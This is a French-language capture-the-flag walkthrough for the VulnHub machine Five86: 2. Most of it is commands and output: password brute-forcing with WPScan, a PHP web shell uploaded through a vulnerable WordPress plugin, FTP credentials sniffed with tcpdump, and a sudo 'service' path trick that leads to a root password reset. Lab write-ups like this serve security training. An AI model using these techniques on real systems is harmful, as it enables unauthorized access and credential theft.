---
title: "Solution du CTF Five86: 2 de VulnHub"
tags: [VulnHub, CTF]
---

Suite et fin de la série de CTF _Five86_ avec ce second opus et avec tous les CTFs signés _@DCAU7_ sur _VulnHub_.

Sur ce [Five86: 2](https://vulnhub.com/entry/five86-2,418/) on trouve quelques idées sympathiques même si déjà vues sur une petite poignée de CTFs.

## Brute

```console
$ sudo nmap -sCV --script vuln -p- -T5 192.168.56.142
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-26 17:29 CEST
Nmap scan report for 192.168.56.142
Host is up (0.00032s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp      ProFTPD 1.3.5e
| vulners: 
|   cpe:/a:proftpd:proftpd:1.3.5e: 
|       SAINT:FD1752E124A72FD3A26EEB9B315E8382  10.0    https://vulners.com/saint/SAINT:FD1752E124A72FD3A26EEB9B315E8382        *EXPLOIT*
|       SAINT:950EB68D408A40399926A4CCAD3CC62E  10.0    https://vulners.com/saint/SAINT:950EB68D408A40399926A4CCAD3CC62E        *EXPLOIT*
|       SAINT:63FB77B9136D48259E4F0D4CDA35E957  10.0    https://vulners.com/saint/SAINT:63FB77B9136D48259E4F0D4CDA35E957        *EXPLOIT*
|       SAINT:1B08F4664C428B180EEC9617B41D9A2C  10.0    https://vulners.com/saint/SAINT:1B08F4664C428B180EEC9617B41D9A2C        *EXPLOIT*
|       PROFTPD_MOD_COPY        10.0    https://vulners.com/canvas/PROFTPD_MOD_COPY     *EXPLOIT*
|       PACKETSTORM:162777      10.0    https://vulners.com/packetstorm/PACKETSTORM:162777      *EXPLOIT*
|       PACKETSTORM:132218      10.0    https://vulners.com/packetstorm/PACKETSTORM:132218      *EXPLOIT*
|       PACKETSTORM:131567      10.0    https://vulners.com/packetstorm/PACKETSTORM:131567      *EXPLOIT*
|       PACKETSTORM:131555      10.0    https://vulners.com/packetstorm/PACKETSTORM:131555      *EXPLOIT*
|       PACKETSTORM:131505      10.0    https://vulners.com/packetstorm/PACKETSTORM:131505      *EXPLOIT*
|       EDB-ID:49908    10.0    https://vulners.com/exploitdb/EDB-ID:49908      *EXPLOIT*
|       CVE-2015-3306   10.0    https://vulners.com/cve/CVE-2015-3306
|       1337DAY-ID-36298        10.0    https://vulners.com/zdt/1337DAY-ID-36298        *EXPLOIT*
|       1337DAY-ID-23720        10.0    https://vulners.com/zdt/1337DAY-ID-23720        *EXPLOIT*
|       1337DAY-ID-23544        10.0    https://vulners.com/zdt/1337DAY-ID-23544        *EXPLOIT*
|       SSV:61050       5.0     https://vulners.com/seebug/SSV:61050    *EXPLOIT*
|       CVE-2020-9272   5.0     https://vulners.com/cve/CVE-2020-9272
|       CVE-2019-19272  5.0     https://vulners.com/cve/CVE-2019-19272
|       CVE-2019-19271  5.0     https://vulners.com/cve/CVE-2019-19271
|       CVE-2019-19270  5.0     https://vulners.com/cve/CVE-2019-19270
|       CVE-2019-18217  5.0     https://vulners.com/cve/CVE-2019-18217
|       CVE-2016-3125   5.0     https://vulners.com/cve/CVE-2016-3125
|       CVE-2013-4359   5.0     https://vulners.com/cve/CVE-2013-4359
|       CVE-2019-19269  4.0     https://vulners.com/cve/CVE-2019-19269
|       CVE-2017-7418   2.1     https://vulners.com/cve/CVE-2017-7418
|_      CVE-2021-46854  0.0     https://vulners.com/cve/CVE-2021-46854
80/tcp open   http     Apache httpd 2.4.41 ((Ubuntu))
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.142
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.56.142:80/
|     Form id: 
|_    Form action: http://five86-2/
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 5.1.4
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-wordpress-users: 
| Username found: admin
| Username found: barney
| Username found: gillian
| Username found: peter
| Username found: stephen
|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
|_http-dombased-xss: Couldn't find any DOM based XSS.
| vulners: 
|   cpe:/a:apache:http_server:2.4.41: 
|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943
|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
|       CVE-2020-11984  7.5     https://vulners.com/cve/CVE-2020-11984
|       CNVD-2022-73123 7.5     https://vulners.com/cnvd/CNVD-2022-73123
|       CNVD-2022-03225 7.5     https://vulners.com/cnvd/CNVD-2022-03225
|       CNVD-2021-102386        7.5     https://vulners.com/cnvd/CNVD-2021-102386
|       1337DAY-ID-34882        7.5     https://vulners.com/zdt/1337DAY-ID-34882        *EXPLOIT*
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438
|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452
|       CNVD-2022-03224 6.8     https://vulners.com/cnvd/CNVD-2022-03224
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
|       4373C92A-2755-5538-9C91-0469C995AA9B    6.8     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B  *EXPLOIT*
|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE  *EXPLOIT*
|       CVE-2022-28615  6.4     https://vulners.com/cve/CVE-2022-28615
--- snip ---
|       CNVD-2022-03223 5.0     https://vulners.com/cnvd/CNVD-2022-03223
|       CVE-2020-11993  4.3     https://vulners.com/cve/CVE-2020-11993
|       1337DAY-ID-35422        4.3     https://vulners.com/zdt/1337DAY-ID-35422        *EXPLOIT*
|       CVE-2023-27522  0.0     https://vulners.com/cve/CVE-2023-27522
|       CVE-2023-25690  0.0     https://vulners.com/cve/CVE-2023-25690
|       CVE-2022-37436  0.0     https://vulners.com/cve/CVE-2022-37436
|       CVE-2022-36760  0.0     https://vulners.com/cve/CVE-2022-36760
|_      CVE-2006-20001  0.0     https://vulners.com/cve/CVE-2006-20001
MAC Address: 08:00:27:B7:54:45 (Oracle VirtualBox virtual NIC)
```

D'après le scan Nmap, le serveur _ProFTPd_ serait vulnérable à la faille _mod_copy_ déjà exploitée sur le [CTF Symfonos #2]({% link _posts/2023-02-20-Solution-du-CTF-Symfonos-2-de-VulnHub.md %}).

Mais ici l'accès nécessite des identifiants valides, on ne peut donc pas tenter d'utiliser la faille pour exfiltrer des données.

En jetant un œil dans le dossier `/wp-content/uploads/` je remarque un dossier nommé `articulate_uploads` qui semble faire référence au plugin `Insert or Embed Articulate Content into WordPress` or ce plugin est touché par une vulnérabilité :

[WordPress Plugin Insert or Embed Articulate Content into WordPress - Remote Code Execution - PHP webapps Exploit](https://www.exploit-db.com/exploits/46981)

Il faut disposer d'un compte sur le Wordpress pour l'exploitation, mais on devine quelle sera notre prochaine étape.

Nmap ayant déjà fait l'énumération des utilisateurs Wordpress pour nous, il ne nous reste qu'à bruteforcer les mots de passe de ces comptes :

```bash
docker run --add-host five86-2:192.168.56.142 -v /tools/wordlists/:/data/  -it --rm wpscanteam/wpscan --url http://five86-2/ -U admin,peter,barney,gillian,stephen -P /data/rockyou.txt
```

Il faut compter un bon moment, mais deux finissent par tomber :

```
[SUCCESS] - barney / spooky1                                                                                                                                                                                      
[SUCCESS] - stephen / apollo1
```

Le premier est celui qui nous intéresse, car il dispose de suffisamment de droits pour publier des articles. L'exploitation du plugin vulnérable se fait en effet lors de l'édition d'un article.

On suit la procédure de l'exploit à savoir créer une archive ZIP contenant un html et un php :

```bash
echo "<html>hello</html>" > index.html
echo '<?php echo system($_GET["cmd"]); ?>' > index.php
zip poc.zip index.html index.php 
```

Sur l'article, il faut alors ajouter un block de type e-learning et uploader le ZIP.
On retrouve ainsi notre shell PHP à l'adresse `/wp-content/uploads/articulate_uploads/poc/index.php`.

## I'm watching your packets

Je commence par récupérer les identifiants de base de données dans la configuration du Wordpress :

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpressdb' );

/** MySQL database username */
define( 'DB_USER', 'dbuser' );

/** MySQL database password */
define( 'DB_PASSWORD', '4Te3bRd483e' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

Je peux en extraire plusieurs hashes mais tenter de les casser ne m'amène nul part.

```console
mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+------------------------+----------+---------------------+---------------------+-------------+-----------------+
| ID | user_login | user_pass                          | user_nicename | user_email             | user_url | user_registered     | user_activation_key | user_status | display_name    |
+----+------------+------------------------------------+---------------+------------------------+----------+---------------------+---------------------+-------------+-----------------+
|  1 | admin      | $P$BJQSBmO3Hj5SIDKzAkVX8wQYN6EJqx/ | admin         | blahblahblah@blah.blah |          | 2020-01-09 00:09:52 |                     |           0 | admin           |
|  2 | barney     | $P$Brk7T36qysdSksZmPyfdQCqpoaIqvN1 | barney        | barney@blah.blah       |          | 2020-01-09 00:11:36 |                     |           0 | Barney Sumner   |
|  4 | gillian    | $P$BJxWr8/nTjEC6IttflERKg2v.THUNA1 | gillian       | gillian@blah.blah      |          | 2020-01-09 00:13:03 |                     |           0 | Gillian Gilbert |
|  5 | peter      | $P$B3eHaQ66YFM6EwWB6y/Y3i/3ud1Kqp/ | peter         | peter@blah.blah        |          | 2020-01-09 00:13:53 |                     |           0 | Peter Hook      |
|  6 | stephen    | $P$BcQaPOdWmcAzREQh9rR2bmGBBz6qUO1 | stephen       | stephen@blah.blah      |          | 2020-01-09 00:39:17 |                     |           0 | Stephen Morris  |
+----+------------+------------------------------------+---------------+------------------------+----------+---------------------+---------------------+-------------+-----------------+
```

Sur le système, on trouve d'autres utilisateurs.

```
barney:x:1001:1001:Barney Sumner:/home/barney:/bin/bash
stephen:x:1002:1002:Stephen Morris:/home/stephen:/bin/bash
peter:x:1003:1003:Peter Hook:/home/peter:/bin/bash
gillian:x:1004:1004:Gillian Gilbert:/home/gillian:/bin/bash
richard:x:1005:1005:Richard Starkey:/home/richard:/bin/bash
paul:x:1006:1006:Paul McCartney:/home/paul:/bin/bash
john:x:1007:1007:John Lennon:/home/john:/bin/bash
george:x:1008:1008:George Harrison:/home/george:/bin/bash
```

Finalement en testant je découvre que le mot de passe de `stephen` fonctionne aussi pour la commande `su`.

L'utilisateur est membre du groupe `pcap` ce qui sonne comme une autorisation pour mettre le trafic réseau en écoute.

```console
stephen@five86-2:~$ id
uid=1002(stephen) gid=1002(stephen) groups=1002(stephen),1009(pcap)
```

D'ailleurs, coup de bol, si je regarde les process je vois clairement un script qui semble se connecter au serveur FTP.

```
root      2218  0.0  0.2   7748  2372 ?        S    16:48   0:00 /usr/sbin/CRON -f
paul      2219  0.0  0.0   2600   688 ?        Ss   16:48   0:00 /bin/sh -c /home/paul/ftp_upload.sh > /dev/null 2>&1
paul      2220  0.0  0.0   2600   752 ?        S    16:48   0:00 /bin/sh /home/paul/ftp_upload.sh
paul      2221  0.0  0.2   3224  2100 ?        S    16:48   0:00 ftp -n 172.18.0.10
1000      2222  0.0  0.7 133068  7732 pts/0    S+   16:48   0:00 proftpd: paul - 172.18.0.1: STOR file.txt
```

Je mets le port 21 sur écoute et j'attends un peu :

```console
stephen@five86-2:~$ tcpdump -i any -X "tcp port 21"
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on any, link-type LINUX_SLL (Linux cooked v1), capture size 262144 bytes
16:54:11.802536 IP five86-2.60646 > 172.18.0.10.ftp: Flags [P.], seq 1:12, ack 58, win 502, options [nop,nop,TS val 1863508039 ecr 2147577322], length 11: FTP: USER paul
        0x0000:  4510 003f 5b30 4000 4006 8749 ac12 0001  E..?[0@.@..I....
        0x0010:  ac12 000a ece6 0015 933b b364 fd23 fc04  .........;.d.#..
        0x0020:  8018 01f6 5861 0000 0101 080a 6f12 e047  ....Xa......o..G
        0x0030:  8001 6dea 5553 4552 2070 6175 6c0d 0a    ..m.USER.paul..
16:54:11.808018 IP 172.18.0.10.ftp > five86-2.60646: Flags [P.], seq 58:90, ack 12, win 510, options [nop,nop,TS val 2147577328 ecr 1863508039], length 32: FTP: 331 Password required for paul
        0x0000:  4500 0054 a4ea 4000 4006 3d8a ac12 000a  E..T..@.@.=.....
        0x0010:  ac12 0001 0015 ece6 fd23 fc04 933b b36f  .........#...;.o
        0x0020:  8018 01fe 5876 0000 0101 080a 8001 6df0  ....Xv........m.
        0x0030:  6f12 e047 3333 3120 5061 7373 776f 7264  o..G331.Password
        0x0040:  2072 6571 7569 7265 6420 666f 7220 7061  .required.for.pa
        0x0050:  756c 0d0a                                ul..
16:54:11.808738 IP five86-2.60646 > 172.18.0.10.ftp: Flags [P.], seq 12:33, ack 90, win 502, options [nop,nop,TS val 1863508045 ecr 2147577328], length 21: FTP: PASS esomepasswford
        0x0000:  4510 0049 5b32 4000 4006 873d ac12 0001  E..I[2@.@..=....
        0x0010:  ac12 000a ece6 0015 933b b36f fd23 fc24  .........;.o.#.$
        0x0020:  8018 01f6 586b 0000 0101 080a 6f12 e04d  ....Xk......o..M
        0x0030:  8001 6df0 5041 5353 2065 736f 6d65 7061  ..m.PASS.esomepa
        0x0040:  7373 7766 6f72 640d 0a                   sswford..

```

Le mot de passe récupéré (`esomepasswford`) permet de se connecter avec le compte de `paul`.

## GTFO

`Paul` a une autorisation de `Peter` pour la commande `service`.

```console
paul@five86-2:~$ sudo -l
Matching Defaults entries for paul on five86-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User paul may run the following commands on five86-2:
    (peter) NOPASSWD: /usr/sbin/service
```

Grâce à la base _GTFObins_ je trouve [une entrée](https://gtfobins.github.io/gtfobins/service/) spécifique à ce service.

La suite est assez simple : `Peter` peut réinitialiser le mot de passe de n'importe qui, on change donc celui de root :

```console
paul@five86-2:~$ sudo -u peter /usr/sbin/service ../../bin/sh
$ id
uid=1003(peter) gid=1003(peter) groups=1003(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd),1010(ncgroup)
$ sudo -l
Matching Defaults entries for peter on five86-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User peter may run the following commands on five86-2:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/passwd
$ sudo -u root /usr/bin/passwd
New password: 
Retype new password: 
passwd: password updated successfully
$ su
Password: 
root@five86-2:/# cd /root
root@five86-2:~# ls
snap  thisistheflag.txt
root@five86-2:~# cat thisistheflag.txt

__   __            _                           _                                 _ _ _ _ _ 
\ \ / /           | |                         | |                               | | | | | |
 \ V /___  _   _  | |__   __ ___   _____    __| | ___  _ __   ___  __      _____| | | | | |
  \ // _ \| | | | | '_ \ / _` \ \ / / _ \  / _` |/ _ \| '_ \ / _ \ \ \ /\ / / _ \ | | | | |
  | | (_) | |_| | | | | | (_| |\ V /  __/ | (_| | (_) | | | |  __/  \ V  V /  __/ | |_|_|_|
  \_/\___/ \__,_| |_| |_|\__,_| \_/ \___|  \__,_|\___/|_| |_|\___|   \_/\_/ \___|_|_(_|_|_)
                                                                                           
                                                                                           
Congratulations - hope you enjoyed Five86-2.

If you have any feedback, please let me know at @Five86_x

I also want to send out a big thanks to all those who help me with beta testing
of the various challenges:  @m0tl3ycr3w and @syed__umar in particular
```

## Sous le capot

Petit con d'œil à l'entrée crontab et au script FTP correspondant :

```console
root@five86-2:~# tail -2 /var/spool/cron/crontabs/paul 
# m h  dom mon dow   command
*/2 * * * * /home/paul/ftp_upload.sh > /dev/null 2>&1
root@five86-2:~# cat /home/paul/ftp_upload.sh
#!/bin/sh
HOST='172.18.0.10'
USER='paul'
PASSWD='esomepasswford'
FILE='file.txt'

ftp -n $HOST <<END_SCRIPT
quote USER $USER
quote PASS $PASSWD
binary
put $FILE
quit
END_SCRIPT
exit 0
```


